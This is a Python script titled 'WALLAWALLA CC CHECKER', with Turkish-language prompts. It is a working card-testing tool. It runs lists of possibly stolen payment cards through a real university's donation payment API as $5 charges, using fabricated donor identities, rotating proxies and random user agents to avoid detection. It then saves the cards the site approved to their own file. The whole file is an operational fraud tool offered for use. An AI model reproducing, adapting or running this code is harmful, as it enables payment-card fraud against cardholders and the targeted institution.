import requests
import re
import time
import random
import string
import json
import base64
import os
from user_agent import generate_user_agent

def parse_proxy(proxy_str):
   
    proxy_str = proxy_str.strip()
    
   
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    
   
    if '@' in proxy_str:
        auth, addr = proxy_str.split('@')
        if ':' in auth:
            user, pwd = auth.split(':', 1)
            ip, port = addr.split(':')
            return f"http://{user}:{pwd}@{ip}:{port}"
    
   
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    
   
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    
  

def load_proxies(proxy_file="proxies.txt"):
   
    if not os.path.exists(proxy_file):
        return []
    proxies = []
    with open(proxy_file, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                parsed = parse_proxy(line)
                if parsed:
                    proxies.append(parsed)
                else:
                    print(f"[!] Proxy parse edilemedi: {line[:50]}")
    return proxies

def get_random_proxy(proxy_file="proxies.txt"):
  
    proxies = load_proxies(proxy_file)
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {'http': proxy, 'https': proxy}


def parse_card(card_data):
    
    parts = card_data.replace(' ', '').split('|')
    if len(parts) < 3:
        return None
    card_number = parts[0].strip()
    exp_month = parts[1].strip().zfill(2)
    exp_year = parts[2].strip()
    if len(exp_year) == 2:
        exp_year = f'20{exp_year}'
    cvv = parts[3].strip() if len(parts) > 3 else '123'
    return card_number, exp_month, exp_year, cvv


def gdata():
    fnames = ["john","james","robert","michael","william","david","richard","joseph","thomas","charles"]
    lnames = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com"]
    f = random.choice(fnames)
    l = random.choice(lnames)
    num = random.randint(10, 999)
    email = f"{f}.{l}{num}@{random.choice(domains)}"
    name = f"{f.capitalize()} {l.capitalize()}"
    add = f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar'])} St"
    city = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix"])
    zip_code = str(random.randint(10000, 99999))
    phone = f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    return email, name, add, city, zip_code, phone


def check_card(card_data, proxy=None, verbose=False):
    
    parsed = parse_card(card_data)
    if not parsed:
        return {'status': 'ERROR', 'message': 'Invalid format. Use: NUM|MM|YY|CVV'}
    
    card_number, exp_month, exp_year, cvv = parsed
    email, name, add, city, zip_code, phone = gdata()
    
    session = requests.Session()
    user_agent = generate_user_agent()
    
    if proxy:
        session.proxies = proxy
    
    headers = {
        'authority': 'payment.wallawalla.edu',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://payment.wallawalla.edu',
        'referer': 'https://payment.wallawalla.edu/donate/SMSUMMER',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    if verbose:
        print(f"\n[✓] Kart: {card_number[:4]}****{card_number[-4:]}")
        print(f"[✓] Exp: {exp_month}/{exp_year}")
        print(f"[✓] Email: {email}")
        if proxy:
            proxy_str = proxy.get('http', proxy.get('https', 'N/A'))
            print(f"[✓] Proxy: {proxy_str[:50]}...")
    
   
    json_data = {
        'items': [
            {
                'designation_setid': 'SHARE',
                'designation': 'SMSUMMER',
                'data': 'Tommy',
                'amount': '5',
                'anonymous': False,
            },
        ],
        'item_type': 'donation',
        'add_plan': False,
        'is_recurring': False,
        'metadata': {
            'paper_receipt_requested': False,
            'comments': 'Welson',
        },
        'payment_method': 'cc',
        'first_name': name,
        'last_name': name,
        'phone': phone,
        'email': email,
        'street1': add,
        'city': city,
        'state': 'NY',
        'postal': zip_code,
        'country': 'US',
        'card_number': card_number,
        'expiration_month': exp_month,
        'expiration_year': exp_year[-2:],
        'cv_number': cvv,
        'save_information': False,
        'account_nickname': '',
    }
    
    try:
        resp = session.post(
            'https://payment.wallawalla.edu/api/v1/validate/transaction',
            headers=headers,
            json=json_data,
            timeout=30
        )
        data = resp.json()
        
        if 'transaction' not in data:
            return {'status': 'ERROR', 'message': 'Validation failed', 'raw': data}
        
        transaction = data['transaction']
        
        
        json_data = {
            'transaction': transaction,
            'ach_authorization': False,
        }
        
        resp2 = session.post(
            'https://payment.wallawalla.edu/api/v1/pay',
            headers=headers,
            json=json_data,
            timeout=30
        )
        
        result = resp2.json()
        
        
        if result.get('success') or result.get('status') == 'success':
            return {
                'status': 'APPROVED',
                'message': result.get('message', 'Payment successful'),
                'transaction_id': result.get('transaction_id', 'N/A'),
                'raw': result
            }
        elif result.get('error') or result.get('message'):
            error_msg = result.get('error', result.get('message', 'Unknown error'))
            return {
                'status': 'DECLINED',
                'message': error_msg,
                'raw': result
            }
        else:
            return {
                'status': 'UNKNOWN',
                'message': 'Unknown response',
                'raw': result
            }
            
    except Exception as e:
        return {'status': 'ERROR', 'message': str(e)[:100]}


def load_cards(filename):
   
    if not os.path.exists(filename):
        return []
    with open(filename, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip() and '|' in line and not line.startswith('#')]
    return cards


def single_check(card, proxy_file="proxies.txt"):
    """Tek kart kontrol et"""
    print("\n" + "="*60)
    print("  TEKLİ KART KONTROL")
    print("="*60)
    
    proxy_dict = None
    proxies = load_proxies(proxy_file)
    if proxies:
        proxy_dict = get_random_proxy(proxy_file)
        if proxy_dict:
            proxy_str = list(proxy_dict.values())[0]
            print(f"[✓] Proxy kullanılacak: {proxy_str[:50]}...")
    else:
        print("[!] Proxy bulunamadı, doğrudan bağlanılıyor...")
    
    result = check_card(card, proxy_dict, verbose=True)
    
    print("\n" + "="*60)
    print("  SONUÇ")
    print("="*60)
    
    if result['status'] == 'APPROVED':
        print(f"  ✅ STATUS: {result['status']}")
        print(f"  ├─ {result['message']}")
        if result.get('transaction_id'):
            print(f"  └─ Transaction ID: {result['transaction_id']}")
    elif result['status'] == 'DECLINED':
        print(f"  ❌ STATUS: {result['status']}")
        print(f"  └─ {result['message']}")
    else:
        print(f"  ❓ STATUS: {result['status']}")
        print(f"  └─ {result['message']}")
    
    return result


def file_check(input_file, output_file=None, proxy_file="proxies.txt", delay=2):
    """Dosyadan kartları kontrol et"""
    print("\n" + "="*60)
    print("  DOSYA KONTROL")
    print("="*60)
    
    cards = load_cards(input_file)
    if not cards:
        print("[!] Dosyada geçerli kart bulunamadı!")
        return
    
    proxies = load_proxies(proxy_file)
    print(f"[✓] {len(cards)} kart bulundu")
    print(f"[✓] {len(proxies)} proxy bulundu")
    
    if not output_file:
        output_file = f"results_{int(time.time())}.txt"
    
    results = []
    approved_count = 0
    declined_count = 0
    error_count = 0
    
    for i, card in enumerate(cards, 1):
        print(f"\n[{i}/{len(cards)}] {card[:6]}****{card[-4:]}")
        
        proxy_dict = None
        if proxies:
            proxy_dict = get_random_proxy(proxy_file)
            if proxy_dict:
                proxy_str = list(proxy_dict.values())[0]
                print(f"    Proxy: {proxy_str[:50]}...")
            else:
                print(f"    Proxy: None")
        else:
            print(f"    Proxy: Doğrudan")
        
        result = check_card(card, proxy_dict, verbose=False)
        
        status_icon = "✅" if result['status'] == 'APPROVED' else "❌" if result['status'] == 'DECLINED' else "❓"
        print(f"    {status_icon} {result['status']}: {result['message'][:50]}")
        
        if result['status'] == 'APPROVED':
            approved_count += 1
        elif result['status'] == 'DECLINED':
            declined_count += 1
        else:
            error_count += 1
        
        results.append({
            'card': card,
            'status': result['status'],
            'message': result['message'],
            'transaction_id': result.get('transaction_id', 'N/A')
        })
        
        if i < len(cards):
            time.sleep(delay)
    
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("CARD|STATUS|MESSAGE|TRANSACTION_ID\n")
        for r in results:
            f.write(f"{r['card']}|{r['status']}|{r['message']}|{r['transaction_id']}\n")
    
    
    approved_file = output_file.replace('.txt', '_approved.txt')
    with open(approved_file, 'w', encoding='utf-8') as f:
        for r in results:
            if r['status'] == 'APPROVED':
                f.write(f"{r['card']}|{r['transaction_id']}\n")
    
    print(f"\n" + "="*60)
    print("  SONUÇLAR")
    print("="*60)
    print(f"  ✅ Approved: {approved_count}")
    print(f"  ❌ Declined: {declined_count}")
    print(f"  ❓ Error: {error_count}")
    print(f"  📁 Kaydedildi: {output_file}")
    print(f"  📁 Approved list: {approved_file}")


def main():
    print("="*60)
    print("  WALLAWALLA CC CHECKER")
    print("  Single & File Check")
    print("="*60)
    
    proxy_file = input("\n[?] Proxy dosyası (default: proxies.txt): ").strip() or "proxies.txt"
    
   
    proxies = load_proxies(proxy_file)
    if proxies:
        print(f"[✓] {len(proxies)} proxy yüklendi")
    else:
        print("[!] Proxy bulunamadı, doğrudan bağlanılacak")
    
    mode = input("[?] Tek kart mı yoksa dosya mı? (single/file): ").strip().lower()
    
    if mode == 'single':
        card = input("[?] Kart (NUM|MM|YY|CVV): ").strip()
        if not card:
            print("[!] Kart girilmedi!")
            return
        single_check(card, proxy_file)
    
    elif mode == 'file':
        input_file = input("[?] Input dosyası: ").strip()
        if not os.path.exists(input_file):
            print(f"[!] Dosya bulunamadı: {input_file}")
            return
        output_file = input("[?] Output dosyası (boş bırak otomatik): ").strip() or None
        delay = input("[?] Kartlar arası bekleme (saniye, default 2): ").strip()
        delay = int(delay) if delay else 2
        
        file_check(input_file, output_file, proxy_file, delay)
    
    else:
        print("[!] Geçersiz seçim!")

if __name__ == "__main__":
    main()